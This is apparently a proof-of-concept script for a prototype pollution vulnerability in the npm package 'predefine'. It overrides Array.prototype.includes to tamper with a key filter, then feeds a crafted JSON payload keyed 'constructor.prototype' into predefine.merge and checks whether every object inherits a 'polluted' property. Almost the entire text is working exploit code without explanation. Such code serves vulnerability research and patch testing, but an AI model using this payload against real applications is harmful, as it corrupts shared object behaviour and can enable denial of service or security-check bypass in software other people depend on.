Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
console.log({}.polluted);
var predefine = require('predefine');
const payload = JSON.parse('{"constructor.prototype": {"polluted":"yes"}}');
predefine.merge({}, payload);
console.log({}.polluted);